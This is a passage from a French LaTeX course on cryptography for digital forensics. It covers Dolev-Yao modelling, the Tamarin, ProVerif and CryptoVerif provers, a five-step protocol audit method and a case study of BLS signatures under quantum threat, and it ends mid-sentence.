Le modèle Dolev-Yao \textbf{ignore délibérément} la cryptanalyse des
primitives (objet du Ch.~\ref{chap:cryptanal}, Section~``contre les
primitives'' du Tableau~30.1) pour se concentrer exclusivement sur
les \textbf{failles logiques du protocole}~: l'agencement des
messages, l'ordre des étapes, la gestion des identités. Cette
séparation permet d'isoler deux questions distinctes~: ``la
mathématique sous-jacente est-elle solide~?'' (cryptanalyse des
primitives, Ch.~\ref{chap:cryptanal}) et ``même avec une mathématique
parfaite, le protocole est-il logiquement bien conçu~?'' (analyse
formelle, ce chapitre). Un protocole peut échouer sur l'une de ces
deux dimensions indépendamment de l'autre, la taxonomie du
Tableau~30.1 distingue précisément les failles ``contre le
protocole'' (logiques, du ressort de Dolev-Yao) des failles ``contre
les primitives'' (mathématiques, hors du périmètre Dolev-Yao).
\end{boxalert}

\subsection{Formalisation des propriétés de sécurité}

Les propriétés de sécurité attendues d'un protocole doivent être
exprimées de manière formelle et mécaniquement vérifiable, pas
seulement décrites en langage naturel. Quatre propriétés reviennent
systématiquement dans l'analyse de protocoles à vocation forensique
ou juridique~:

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{4.5cm}}{%
    \tableauHeader{Propriété} &
    \tableauHeader{Lemme typique} &
    \tableauHeader{Pertinence forensique}
}
Non-répudiation & \texttt{lemma\_nonRep\_origin} &
    Un signataire ne peut nier avoir produit une signature,
    fondement de la valeur probatoire d'eIDAS
    (Ch.~11~(UE~SEC4031)) \\
Confidentialité & \texttt{lemma\_confidentiality} &
    Aucune information sur le message n'est exposée au-delà de ce
    qui est strictement nécessaire, correspond à $\mathsf{Conf}$
    (Ch.~\ref{chap:CRO}) \\
Authenticité & \texttt{lemma\_unforgeability} &
    Une signature ne peut être forgée sans la clé privée
    correspondante, fondement de la chaîne de custody
    numérique (Ch.~8~(UE~SEC4031)) \\
Intégrité (engagement) & \texttt{lemma\_binding} &
    Une preuve ne peut être réinterprétée \textit{a posteriori}
    pour correspondre à un message différent, analogue au
    hash SHA-256 garantissant qu'une image E01 n'a pas été
    altérée (Ch.~8~(UE~SEC4031)) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~31.1. Quatre propriétés de
sécurité fondamentales et leur formalisation typique}\end{center}

% ============================================================================
\section{Outils d'Analyse Formelle}
\label{sec:outils-formels}
% ============================================================================

\subsection{Le \textit{prover} Tamarin}

\termecle{Tamarin Prover}\index{Tamarin Prover} est l'outil de
référence pour les preuves symboliques de protocoles. Il modélise
le protocole et les capacités de l'adversaire (typiquement,
Dolev-Yao) via des \textbf{règles de réécriture}, et permet de
vérifier automatiquement des propriétés de sécurité exprimées en
\textbf{logique temporelle}, c'est-à-dire des propriétés qui
portent non seulement sur les états du système mais sur la
\textbf{séquence} des événements (``si~$A$ se produit, alors~$B$
s'est nécessairement produit avant'').

\begin{boxoutils}{Principe de fonctionnement de Tamarin~(vue conceptuelle)}
\begin{lstlisting}[language=bash_forensique]
# STRUCTURE TYPE D'UN MODELE TAMARIN (illustration pedagogique,
# pas un fichier executable -- la syntaxe Tamarin reelle est plus
# riche ; se referer a la documentation officielle du projet
# pour toute utilisation effective)

# 1. Declaration des regles de reecriture (le protocole)
rule Register_Key:
    [ Fr(~ltk) ]
    --[ KeyGen($A, ~ltk) ]->
    [ !Ltk($A, ~ltk), !Pk($A, pk(~ltk)) ]

rule Sign_Message:
    [ !Ltk($A, ~ltk), In(m) ]
    --[ Signed($A, m) ]->
    [ Out(sign(m, ~ltk)) ]

# 2. Declaration des capacites de l'adversaire (Dolev-Yao
#    standard, generalement implicite dans Tamarin)

# 3. Formalisation des lemmes (proprietes a verifier)
lemma non_repudiation:
    "All A m #i. Signed(A, m) @ i ==>
        (Ex #j. KeyGen(A, ltk) @ j & j < i)"

# 4. Execution : Tamarin explore l'espace des etats accessibles
#    a l'adversaire et tente soit de PROUVER le lemme (preuve
#    valide pour tous les etats), soit de trouver une TRACE
#    D'ATTAQUE qui le viole
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{L'état ``non prouvé'' n'est pas une faille}
Un résultat fréquent en pratique~: Tamarin (ou ProVerif) termine
sur un état \textbf{``non prouvé''} (\textit{inconclusive}), ni
preuve de validité, ni trace d'attaque trouvée. Ce résultat
\textbf{n'indique pas une faille du protocole}, c'est une
limitation bien documentée de ces outils, due à
l'\textbf{explosion de l'espace d'états}~: pour des protocoles
complexes combinant plusieurs primitives, l'espace des
comportements possibles de l'adversaire devient trop vaste pour
une exploration automatique exhaustive en temps fini. Un résultat
``non prouvé'' signale la nécessité de~: (a)~preuves manuelles
complémentaires ciblées sur les parties non couvertes, ou
(b)~une simplification du modèle (au prix d'une perte de
généralité), ou (c)~un découpage du protocole en sous-composants
analysés séparément. \textbf{Cette distinction, absence de
preuve $\neq$ preuve d'absence, est rigoureusement la même
que celle pratiquée en investigation forensique}~: l'absence
d'une preuve dans un dossier ne démontre jamais l'innocence, elle
signale seulement une question restée sans réponse
(Ch.~7~(UE~SEC4031), distinction constatation/analyse).
\end{boiteRemarque}

\subsection{Panorama comparatif des outils}

\begin{tableaucours}{p{2.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Outil} &
    \tableauHeader{Type de preuve} &
    \tableauHeader{Application principale}
}
\textbf{Tamarin} & Preuve symbolique &
    Protocoles complexes, propriétés temporelles (séquences
    d'événements, ordre causal entre actions) \\
\textbf{ProVerif} & Vérification automatique &
    Protocoles plus simples, propriétés d'équivalence
    (indistinguabilité de deux exécutions) \\
\textbf{CryptoVerif} & Preuve computationnelle &
    Preuves dans le modèle standard (au-delà du modèle
    symbolique~: tient compte des probabilités d'attaque,
    pas seulement de leur possibilité logique) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~31.2. Comparatif des principaux
outils d'analyse formelle}\end{center}

\begin{boiteRemarque}{Symbolique vs computationnel~: une distinction
qui rejoint le Ch.~\ref{chap:CRO}}
Tamarin et ProVerif opèrent dans le \textbf{modèle symbolique}
(Dolev-Yao~: les primitives sont des boîtes noires parfaites).
CryptoVerif opère dans le \textbf{modèle computationnel}, plus
proche de l'approche information-théorique du cadre CLO
(Ch.~\ref{chap:CRO})~: les primitives y sont modélisées avec leurs
véritables propriétés probabilistes (négligeabilité, avantage de
l'adversaire), pas comme des oracles parfaits. Un protocole
``prouvé sûr'' dans le modèle symbolique offre une garantie plus
faible qu'un protocole ``prouvé sûr'' dans le modèle computationnel~:
le premier suppose que les primitives sous-jacentes sont parfaites
(hypothèse simplificatrice), le second quantifie explicitement le
risque résiduel, exactement la démarche des Théorèmes~1 à~3 du
Ch.~\ref{chap:CRO}, qui bornent $\mathsf{Conf}$, $\mathsf{Rel}$,
$\mathsf{Opp}$ par des quantités explicitement probabilistes
($\mathrm{negl}(\lambda)$), pas par de simples impossibilités
logiques.
\end{boiteRemarque}

% ============================================================================
\section{Méthodologie d'Audit en Cinq Étapes}
\label{sec:methodologie-audit}
% ============================================================================

Cette méthodologie systématique, standard dans la pratique
professionnelle de l'audit de protocoles cryptographiques, guide
l'analyse de tout protocole, qu'il s'agisse d'un nouveau schéma
proposé ou d'un mécanisme existant que l'investigateur doit évaluer
en contexte forensique (Ch.~\ref{chap:rapport}, témoignage
d'expert sur la fiabilité d'un mécanisme contesté).

\begin{tableaucours}{p{2.3cm}p{8.7cm}}{%
    \tableauHeader{Étape} &
    \tableauHeader{Contenu}
}
\textbf{1. Compréhension} & Analyse approfondie du \textit{whitepaper},
    de la documentation et, si disponible, du code source.
    Identification des acteurs, des messages échangés, des
    primitives cryptographiques employées et des objectifs de
    sécurité annoncés. \\
\textbf{2. Modélisation} & Définition explicite du modèle de menace
    (typiquement Dolev-Yao, Section~\ref{sec:modelisation-menaces})
    et formalisation des propriétés de sécurité attendues sous
    forme de lemmes vérifiables (Tableau~31.1). \\
\textbf{3. Analyse manuelle} & Recherche ciblée de vulnérabilités
    connues~: attaque par rejeu de \textit{nonce}, faiblesse du
    générateur de nombres aléatoires, mauvaise gestion de l'état
    des sessions, erreurs de composition entre primitives
    individuellement sûres (cf.~Tableau~30.1, faille ``contre le
    protocole''). \\
\textbf{4. Analyse automatisée} & Implémentation du modèle dans
    un outil tel que Tamarin ou ProVerif (Section~\ref{sec:outils-formels})
    pour une vérification exhaustive des propriétés contre un
    adversaire actif, dans les limites de l'explosion de l'espace
    d'états. \\
\textbf{5. Test d'implémentation} & Si une implémentation concrète
    est disponible~: tests pratiques (\textit{fuzzing} des entrées,
    analyse dynamique, tests de performance sous charge) et analyse
    statique du code source pour détecter des bugs d'implémentation
    (Tableau~30.1, faille ``d'implémentation'', distincte d'une
    faille conceptuelle). \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~31.3. Méthodologie d'audit
en cinq étapes}\end{center}

\begin{boxscenario}{Application de la méthodologie à un cas du cours~:
audit d'un mécanisme de signature de rapport}
Supposons qu'un nouveau mécanisme de signature pour les rapports
d'expertise forensique camerounais (Ch.~\ref{chap:rapport}) vous
soit soumis pour audit.

\textbf{Étape~1 (Compréhension)}~: lecture de la spécification~:
le mécanisme combine une signature ECDSA (Ch.~\ref{chap:prim-crypt})
avec un horodatage qualifié.

\textbf{Étape~2 (Modélisation)}~: modèle Dolev-Yao standard.
Lemmes à vérifier~: \texttt{non\_repudiation} (l'expert ne peut nier
avoir signé), \texttt{temporal\_integrity} (l'horodatage ne peut
être falsifié indépendamment de la signature).

\textbf{Étape~3 (Analyse manuelle)}~: vérifier si le mécanisme est
vulnérable à une attaque par rejeu, un rapport signé pourrait-il
être présenté une seconde fois, dans une affaire différente, comme
preuve falsifiée~? Cela dépend de la présence d'un identifiant de
session unique dans le message signé.

\textbf{Étape~4 (Analyse automatisée)}~: modélisation dans
Tamarin~; si le résultat est ``non prouvé'' pour la propriété de
non-rejeu, cela signale, conformément à la
Section~\ref{sec:outils-formels}, la nécessité d'une preuve
manuelle complémentaire, pas nécessairement une faille avérée.

\textbf{Étape~5 (Test d'implémentation)}~: si une implémentation
logicielle existe pour ce mécanisme, fuzzer les champs d'entrée
(date, identifiant d'affaire) pour détecter d'éventuels bugs de
validation.
\end{boxscenario}

% ============================================================================
\section{Rigueur sur les Travaux en Cours~: une Réserve Méthodologique}
\label{sec:reserve-zk-nr}
% ============================================================================

\begin{boiteRemarque}{Cohérence avec le Chapitre~\ref{chap:cryptanal}}
Le Ch.~\ref{chap:cryptanal} a mentionné le protocole de recherche
ZK-NR (\textit{Zero-Knowledge Non-Repudiation}), développé par
l'auteur de ce cours, en signalant explicitement qu'aucun article
complet correspondant n'était disponible pour vérification dans le
cadre de ce projet. La même réserve s'applique ici~: toute
affirmation précise sur le nombre de règles symboliques, de lemmes
formalisés, ou sur le statut exact (prouvé / non prouvé / réfuté)
d'une vérification Tamarin appliquée à ce protocole spécifique
\textbf{ne peut être incluse dans ce cours sans accès à une
publication ou un rapport technique vérifiable}.

\textbf{Ce qui peut être affirmé en toute rigueur}~: la méthodologie
en cinq étapes présentée dans ce chapitre (Section~\ref{sec:methodologie-audit})
constitue le cadre approprié pour conduire, le moment venu, l'audit
formel de tout protocole combinant plusieurs primitives, y compris
un protocole tel que ZK-NR, combinant engagements, preuves à
divulgation nulle et signatures à seuil. L'application effective
de cette méthodologie, et la publication de ses résultats
(prouvés, réfutés, ou non conclusifs), relève d'un travail de
recherche distinct de ce cours.

Cette transparence sur les limites de ce qui peut être affirmé,
ici comme au Ch.~\ref{chap:cryptanal}, illustre elle-même le
principe central de ce chapitre~: \textbf{distinguer rigoureusement
ce qui est prouvé, ce qui est en cours d'investigation, et ce qui
demeure une question ouverte}, exactement la discipline exigée
d'un rapport forensique (Ch.~\ref{chap:rapport}).
\end{boiteRemarque}

% ============================================================================
\section{De la Preuve de Protocole à la Preuve Forensique}
\label{sec:preuve-protocole-forensique}
% ============================================================================

\begin{boxCRO}
\textbf{Analyse CRO. Vérification formelle et opposabilité}

La vérification formelle d'un protocole, quand elle aboutit à une
preuve complète, constitue un argument d'opposabilité d'un type
particulier~: elle ne dépend pas de la confiance accordée à un
expert individuel, mais de la \textbf{vérifiabilité mécanique et
reproductible} de la preuve elle-même par n'importe quel tiers
disposant de l'outil utilisé.

$\mathcal{O}$~: une preuve Tamarin complète, soumise au tribunal,
peut en principe être \textbf{rejouée indépendamment} par un
expert de la partie adverse, un niveau de vérifiabilité supérieur
à un simple rapport d'expertise narratif (Ch.~\ref{chap:rapport}).

$\mathcal{R}$~: cette garantie est cependant \textbf{relative au
modèle de menace posé} (Dolev-Yao, Section~\ref{sec:modelisation-menaces})~:
une preuve formelle de sécurité ne dit rien sur la résistance aux
attaques par canal auxiliaire, aux failles d'implémentation, ou
à la cryptanalyse des primitives elles-mêmes (Ch.~\ref{chap:cryptanal}).

\cro{$\sim$}{$\uparrow$ dans le modèle posé~; limité hors modèle}{$\uparrow\uparrow$ rejouabilité indépendante}

\textbf{Implication pour le témoignage d'expert}
(Ch.~\ref{chap:rapport})~: un expert présentant une preuve formelle
doit, comme pour toute conclusion technique, \textbf{énoncer
explicitement le modèle de menace sous lequel la preuve est
valide}, exactement la discipline de la section
``Limitations'' déjà pratiquée dans le modèle de rapport du
Ch.~\ref{chap:rapport}.
\end{boxCRO}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Le \textbf{modèle Dolev-Yao} sépare délibérément l'analyse
          logique du protocole (son objet) de la cryptanalyse des
          primitives (objet du Ch.~\ref{chap:cryptanal})~: l'adversaire
          contrôle le réseau mais ne peut casser les primitives
          par force brute.

    \item \textbf{Quatre propriétés fondamentales} à formaliser~:
          non-répudiation, confidentialité, authenticité, intégrité
          (engagement), chacune directement reliable à un
          mécanisme forensique déjà rencontré dans ce cours.

    \item \textbf{Tamarin Prover}~: outil de référence pour les
          preuves symboliques avec propriétés temporelles. Un
          résultat ``non prouvé'' \textbf{n'est pas une faille}~:
          c'est une limitation par explosion de l'espace d'états,
          signalant un besoin de preuve manuelle complémentaire.

    \item \textbf{Trois outils complémentaires}~: Tamarin
          (symbolique, temporel), ProVerif (automatique,
          équivalence), CryptoVerif (computationnel, quantifie le
          risque résiduel plutôt que de poser des primitives
          parfaites), ce dernier rejoignant l'esprit
          probabiliste du cadre CLO (Ch.~\ref{chap:CRO}).

    \item \textbf{Méthodologie en cinq étapes}~: compréhension,
          modélisation, analyse manuelle, analyse automatisée, test
          d'implémentation, applicable à tout protocole, y
          compris en contexte d'audit forensique d'un mécanisme
          contesté.

    \item \textbf{Rigueur sur les affirmations non vérifiables}~:
          ce chapitre s'est volontairement abstenu de détails
          précis sur le protocole de recherche ZK-NR, faute
          d'article vérifiable, cohérence méthodologique directe
          avec la réserve posée au Ch.~\ref{chap:cryptanal}.

    \item \textbf{Vérification formelle et opposabilité}~: une
          preuve formelle complète et rejouable constitue un
          argument d'opposabilité fort, mais \textbf{toujours
          relatif au modèle de menace posé}, à énoncer
          explicitement dans tout témoignage d'expert
          (Ch.~\ref{chap:rapport}).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~31.1. Maîtrise du modèle Dolev-Yao \niveaubase}]
\begin{enumerate}[(a)]
    \item Le modèle Dolev-Yao suppose que l'adversaire ne peut pas
          casser les primitives cryptographiques par force brute.
          En quoi cette hypothèse diffère-t-elle de l'approche du
          cadre CLO (Ch.~\ref{chap:CRO}), qui borne explicitement
          un terme $\mathrm{negl}(\lambda)$ plutôt que de le
          supposer nul~?
    \item Pour chacune des quatre propriétés du Tableau~31.1,
          identifiez le mécanisme forensique de ce cours qui
          l'illustre le mieux, en justifiant.
    \item Un protocole de vote électronique permet à un adversaire
          de rejouer un bulletin déjà soumis. À quelle étape de la
          méthodologie d'audit (Tableau~31.3) cette vulnérabilité
          serait-elle le plus probablement détectée en premier~?
          Justifiez.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~31.2. Interprétation d'un résultat de vérification \niveaumoyen}]
Un outil Tamarin appliqué à un protocole de signature de rapport
forensique (sur le modèle du \texttt{boxscenario} de ce chapitre)
renvoie un résultat ``non prouvé'' pour le lemme
\texttt{non\_repudiation}.
\begin{enumerate}[(a)]
    \item Pourquoi serait-il méthodologiquement incorrect de
          conclure directement que le protocole est vulnérable~?
    \item Quelles sont les trois pistes mentionnées dans ce
          chapitre (Section~\ref{sec:outils-formels}) pour
          progresser face à un tel résultat~? Laquelle
          privilégieriez-vous pour un protocole destiné à un usage
          judiciaire à haute criticité, et pourquoi~?
    \item En vous appuyant sur l'analogie posée dans ce chapitre
          (absence de preuve $\neq$ preuve d'absence), rédigez un
          paragraphe expliquant comment cette même règle
          s'applique à la rédaction d'un rapport forensique
          (Ch.~\ref{chap:rapport})~: que doit faire un investigateur
          qui n'a pas trouvé de preuve d'une hypothèse, sans pouvoir
          non plus la réfuter formellement~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~31.3. Audit complet d'un protocole proposé \niveauexpert}]
Un développeur camerounais propose un nouveau protocole de
``scellement numérique'' pour les pièces à conviction électroniques,
destiné à être utilisé par les OPJ (Ch.~8~(UE~SEC4031)). Le
protocole combine~: un hachage SHA-256 de l'evidence, une signature
ECDSA de l'OPJ, et un horodatage via une autorité tierce.
\begin{enumerate}[(a)]
    \item Appliquez l'Étape~1 (Compréhension) de la méthodologie~:
          identifiez les acteurs, les messages échangés, les
          primitives utilisées et les trois objectifs de sécurité
          que ce protocole devrait viser (référez-vous au
          Ch.~8~(UE~SEC4031)).
    \item Appliquez l'Étape~2 (Modélisation)~: formalisez au moins
          deux lemmes de sécurité pertinents pour ce protocole,
          sur le modèle du Tableau~31.1.
    \item Appliquez l'Étape~3 (Analyse manuelle)~: identifiez au
          moins une vulnérabilité potentielle de composition entre
          les trois primitives (hachage~+ signature~+ horodatage), par exemple, que se passe-t-il si l'horodatage est
          obtenu \emph{avant} la signature plutôt qu'après~?
    \item Pour les Étapes~4 et~5, décrivez (sans les exécuter
          réellement) ce que vous chercheriez à vérifier
          automatiquement, et quels tests d'implémentation
          seraient prioritaires si ce protocole devait être
          déployé dans les unités PNC.
    \item Rédigez un court paragraphe de synthèse destiné à
          l'ANTIC, présentant votre niveau de confiance dans ce
          protocole à l'issue de cet audit partiel, en respectant
          scrupuleusement la distinction entre ce que votre analyse
          établit et ce qui resterait à vérifier avant tout
          déploiement opérationnel.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La Partie~VI a parcouru l'ensemble du socle
théorique de ce cours~: formalisation du Trilemme CRO
(Ch.~\ref{chap:CRO}), application aux primitives réelles
(Ch.~\ref{chap:prim-crypt}), conception et cryptanalyse
(Ch.~\ref{chap:cryptanal}), et enfin l'outillage de la preuve
formelle (ce chapitre). Le chapitre suivant et dernier de ce cours
propose un \textbf{cas pratique intégrateur} mobilisant l'ensemble
de ces outils théoriques sur une situation forensique complète,
clôturant ainsi le parcours entamé au Prologue.
\end{boxinfo}
     
        % ============================================================================
% Fichier  : partie6/P06_C32_cas_pratique_zknr.tex
% Titre    : Cas Pratique -- Audit Formel d'un Protocole Multi-Couches
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 2.0 -- Juin 2026
% ============================================================================

\chapter{Cas Pratique. Audit Formel d'un Protocole Multi-Couches}
\label{chap:cas-zknr}

\epigraph{%
    « In theory, theory and practice are the same. In practice, they are
    not. The true test of any protocol is in its implementation. »%
}{attribué à Albert Einstein, formulation populaire}

\niveauChapitre{Recherche}{%
    Maîtrise complète de la Partie~VI requise (Ch.~\ref{chap:CRO}
    à~\ref{chap:form-meth}). Ce chapitre applique l'ensemble des
    outils théoriques accumulés à un cas concret.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Appliquer intégralement la méthodologie d'audit en cinq
          étapes (Ch.~\ref{chap:form-meth}) à un cas concret~:
          l'analyse cryptanalytique de la signature BLS.
    \item Comprendre la vulnérabilité spécifique de BLS face à
          l'algorithme de Shor, et pourquoi cette vulnérabilité
          motive son couplage architectural avec une primitive
          post-quantique.
    \item Maîtriser une checklist opérationnelle d'analyse face à
          une preuve cryptographique multi-couches rencontrée en
          investigation.
    \item Conduire vous-même, à titre d'exercice guidé, les quatre
          premières étapes de l'audit formel d'une architecture
          multi-couches décrite publiquement, en respectant
          scrupuleusement la distinction entre ce qui peut être
          établi à partir d'une description architecturale et ce
          qui nécessiterait un accès aux spécifications complètes.
    \item Synthétiser, sur cet exemple, l'ensemble des outils de
          la Partie~VI~: Trilemme CRO formalisé, méthodologie de
          calcul des primitives, taxonomie cryptanalytique,
          vérification formelle.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{De la théorie à la pratique~: ce que ce chapitre démontre}
% ============================================================================

Les Chapitres~\ref{chap:CRO} à~\ref{chap:form-meth} ont construit,
brique par brique, l'ensemble des outils nécessaires à l'analyse
rigoureuse d'un système cryptographique~: théorie de l'information,
définitions formelles CLO, taxonomie cryptanalytique, méthodologie
d'audit. Ce chapitre les met en \oe uvre sur un cas réel et entièrement
vérifiable, la signature \textbf{BLS} (Boneh-Lynn-Shacham), une
primitive cryptographique authentique, publiée, abondamment
documentée dans la littérature scientifique, avant de vous guider
dans l'application de cette même méthodologie à une architecture
multi-couches plus ambitieuse, à titre d'exercice de synthèse.

\separateur

% ============================================================================
\section{Étude de Cas Authentique~: la Signature BLS}
\label{sec:etude-bls}
% ============================================================================

\subsection{Fonctionnement et propriétés}

\begin{boxdef}
\textbf{Signature BLS}\index{BLS, signature}~(Boneh, Lynn, Shacham,
2001)~: schéma de signature numérique fondé sur les couplages
bilinéaires (\textit{pairings}) sur courbes elliptiques, typiquement
instancié sur la courbe \texttt{BLS12-381}. Sa propriété distinctive~:
les signatures sont \textbf{courtes} et
\textbf{agrégeables}, plusieurs signatures de plusieurs signataires
sur plusieurs messages peuvent être combinées en une seule signature
compacte, vérifiable efficacement.
\end{boxdef}

Cette propriété d'agrégation rend BLS particulièrement adapté aux
\textbf{systèmes à seuil} (\textit{threshold signatures})~: un
ensemble de signataires peut produire collectivement une signature
unique, sans qu'aucun signataire individuel ne puisse signer seul, pertinent pour des contextes institutionnels où une décision
doit recueillir l'accord de plusieurs parties avant de produire
une attestation juridiquement valable (par exemple, une décision
collégiale en investigation, Ch.~6~(UE~SEC4031), Quality Gates).

\subsection{Cryptanalyse classique et quantique}

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Horizon} &
    \tableauHeader{Fondement de sécurité} &
    \tableauHeader{État de la cryptanalyse}
}
\textbf{Classique} & Difficulté du problème calculatoire de
    Diffie-Hellman (CDH) sur courbes appariées &
    Aucune attaque efficace connue sur BLS12-381 à la date de
    rédaction de ce cours, sécurité considérée comme solide
    face aux capacités de calcul classiques actuelles \\
\textbf{Quantique} & \textit{Le même problème CDH, mais résoluble
    par Shor} & \textbf{Extrêmement vulnérable}~: l'algorithme de
    Shor (Ch.~\ref{chap:quantique}) résout le problème CDH en
    temps polynomial sur un ordinateur quantique suffisamment
    puissant, réduisant la sécurité de la signature
    \textbf{à néant}, pas une dégradation progressive, une
    rupture complète \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~32.1. Cryptanalyse de BLS,
horizons classique et quantique}\end{center}

\begin{boxalert}
\textbf{BLS et le Théorème 1 du Chapitre~\ref{chap:quantique}~:
une application directe}

Cette vulnérabilité de BLS face à Shor n'est pas une particularité
isolée~: elle illustre exactement le Tableau~26.1 du
Ch.~\ref{chap:quantique}, qui classe \textbf{toute} signature fondée
sur le logarithme discret (dont BLS, comme ECDSA) parmi les
primitives vulnérables à Shor. La distinction
hash~\textit{vs.}~signature, déjà établie au Ch.~\ref{chap:quantique},
s'applique ici sans modification~: BLS n'a aucune protection
structurelle particulière contre cette menace, c'est une
signature asymétrique classique, avec les mêmes faiblesses que
toute primitive de sa catégorie.
\end{boxalert}

\subsection{Positionnement qualitatif dans le cadre CRO}

\begin{boiteRemarque}{Rigueur méthodologique~: positionnement
qualitatif, pas un calcul publié}
Conformément à la discipline déjà établie au
Ch.~\ref{chap:prim-crypt} (Section~6, Tableau~28.6), BLS \textbf{ne
dispose pas d'un calcul CLO publié} avec décomposition bit par bit
vérifiable. Le positionnement qui suit est donc qualitatif,
raisonné par analogie avec ECDSA (calcul publié,
Ch.~\ref{chap:prim-crypt}, Section~4), une primitive de
structure comparable (signature asymétrique, transparente par
construction).
\end{boiteRemarque}

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{5.0cm}}{%
    \tableauHeader{Dimension} &
    \tableauHeader{Positionnement attendu} &
    \tableauHeader{Raisonnement par analogie}
}
$\mathsf{Conf}$ & Faible &
    Comme ECDSA (Ch.~\ref{chap:prim-crypt}, $\mathsf{Conf}\approx 0{,}31$)~:
    une signature, par construction, ne masque pas le message
    signé, seule la clé privée reste secrète \\
$\mathsf{Rel}$ & Élevé, \textbf{aujourd'hui} &
    Vérification déterministe~; la falsification exige de
    résoudre le problème CDH, considéré difficile classiquement
    (analogue à la difficulté du logarithme discret elliptique
    pour ECDSA, $\mathsf{Rel}\approx 0{,}98$) \\
$\mathsf{Opp}$ & Probablement élevé, \textbf{aujourd'hui} &
    Jurisprudence émergente autour des signatures à courbes
    elliptiques en général~; cependant moins établie que celle
    d'ECDSA, plus ancien et plus largement déployé dans les
    infrastructures PKI (Ch.~11~(UE~SEC4031)) \\
\textbf{Horizon post-quantique} & \textbf{Effondrement de
    $\mathsf{Rel}$} & Une fois Shor opérationnel à l'échelle requise,
    $\mathsf{Rel}(\text{BLS})$ s'effondre, une signature falsifiable
    n'offre plus aucune fiabilité, indépendamment de son
    opposabilité historique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~32.2. Positionnement CRO
qualitatif de BLS (raisonnement par analogie, non calculé)}\end{center}

Ce déséquilibre temporel, solide aujourd'hui, structurellement
condamné demain, justifie, sur le plan architectural, le principe
de \textbf{défense en profondeur} déjà établi au
Ch.~\ref{chap:cryptanal}~: coupler une primitive performante mais
vulnérable au quantique (BLS) avec une primitive post-quantique
plus lourde mais résistante (par exemple, Dilithium/ML-DSA, FIPS~204,
Ch.~\ref{chap:quantique}), de sorte que la sécurité globale du
système hérite de la résistance du \textbf{plus robuste} des deux
mécanismes face à chaque horizon temporel.

% ============================================================================
\section{Recommandations Opérationnelles pour l'Investigateur}
\label{sec:recommandations-investigateur}
% ============================================================================

\subsection{Face à une signature BLS isolée}

\begin{boxPNC}
\textbf{Protocole d'évaluation d'une signature BLS rencontrée en
investigation}

\textbf{Aujourd'hui}~: une signature BLS valide constitue une preuve
forte d'authenticité et d'intégrité, vérifiable selon les méthodes
standard (Ch.~\ref{chap:rapport}, distinction constatation~:
``la signature BLS vérifie correctement selon l'équation de
vérification publiée'', un fait, indépendant de toute
interprétation).

\textbf{Pour des preuves destinées à un archivage de longue durée}~:
dans une logique \textit{Harvest Now, Decrypt Later}
(Ch.~\ref{chap:quantique}), considérer explicitement qu'une
signature BLS isolée pourrait devenir forgeable dans le futur.
\textbf{Recommandation~:} rechercher systématiquement si une
signature post-quantique complémentaire (Dilithium ou équivalent
FIPS~204) a été archivée en parallèle pour la même pièce, et
documenter son absence le cas échéant comme une limitation du
dossier (sur le modèle des réserves explicites du
Ch.~\ref{chap:rapport}).
\end{boxPNC}

\subsection{Checklist générale d'analyse d'un protocole}

Cette checklist, synthèse opérationnelle de l'ensemble de la
Partie~VI, s'applique à \textbf{tout} protocole cryptographique
rencontré en investigation, qu'il soit simple (une seule primitive)
ou complexe (architecture multi-couches)~:

\begin{enumerate}
    \item[$\square$] Identifier \textbf{toutes} les primitives
          cryptographiques employées (Ch.~\ref{chap:prim-crypt}).
    \item[$\square$] Évaluer leur résistance classique \textbf{et}
          post-quantique pour chacune (Ch.~\ref{chap:quantique},
          Tableau~26.1).
    \item[$\square$] Cartographier les flux de messages et les
          états persistants (Ch.~\ref{chap:form-meth},
          Étape~1~: Compréhension).
    \item[$\square$] Rechercher les vulnérabilités de composition
          et de rejeu entre primitives (Ch.~\ref{chap:cryptanal},
          taxonomie ``contre le protocole''~; Ch.~\ref{chap:form-meth},
          Étape~3).
    \item[$\square$] Vérifier la présence de mécanismes explicites
          de gestion de clés (rotation, révocation), un défaut
          fréquent et souvent sous-estimé dans les architectures
          multi-couches (cf.~Section~\ref{sec:exercice-guide}).
    \item[$\square$] Consulter les preuves formelles disponibles,
          ou, à défaut, modéliser le protocole dans Tamarin ou
          ProVerif (Ch.~\ref{chap:form-meth}).
    \item[$\square$] Distinguer systématiquement, dans toute
          conclusion, ce qui est \textbf{établi et vérifiable}
          de ce qui relève d'une \textbf{hypothèse} ou d'une
          \textbf{question ouverte} (principe transversal de
          la Partie~VI, rappelé à chaque chapitre).
\end{enumerate}

% ============================================================================
\section{Exercice Guidé~: Audit d'une Architecture Multi-Couches}
\label{sec:exercice-guide}
% ============================================================================

\subsection{Contexte de l'exercice}

Le Ch.~\ref{chap:cryptanal} a mentionné, avec la prudence
méthodologique requise, le projet de recherche \textbf{ZK-NR}
(\textit{Zero-Knowledge Non-Repudiation}) de l'auteur de ce cours~:
une architecture combinant quatre couches, engagements de
Merkle, preuves STARK, signatures à seuil BLS, signatures
post-quantiques Dilithium, pour des scénarios de non-répudiation
à forte criticité.

\begin{boxalert}
\textbf{Ce que cet exercice est, et ce qu'il n'est pas}

Cet exercice \textbf{n'est pas} la présentation de résultats d'audit
établis~: ZK-NR n'existe qu'en prépublication~\cite{minka2025zknr},
sans évaluation par les pairs ni audit indépendant, et ce serait contraire à la rigueur
